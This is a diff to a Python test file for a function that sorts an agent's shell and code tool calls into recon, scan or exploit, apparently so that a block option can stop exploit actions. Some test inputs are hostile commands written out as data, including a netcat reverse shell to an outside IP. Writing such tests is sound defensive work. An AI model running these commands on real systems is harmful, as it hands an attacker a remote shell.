@@ -48,7 +48,11 @@ class TestInferToolAction:
         assert infer_tool_action("python_execute", {"code": "os.system('id')"}) == "exploit"
 
     def test_shell_command_classification(self):
-        assert infer_tool_action("shell_command", {"command": "whoami"}) == "recon"
+        # Conservative default: only known read-only inspection commands stay
+        # "recon"; anything else (e.g. whoami) is treated as exploit so
+        # --block-actions exploit cannot be bypassed by arbitrary commands.
+        assert infer_tool_action("shell_command", {"command": "whoami"}) == "exploit"
+        assert infer_tool_action("shell_command", {"command": "dig example.com A"}) == "recon"
         assert infer_tool_action("shell_command", {"command": "curl http://t/"}) == "scan"
         assert infer_tool_action("shell_command", {"command": "nc -e /bin/sh 1.2.3.4"}) == "exploit"
 
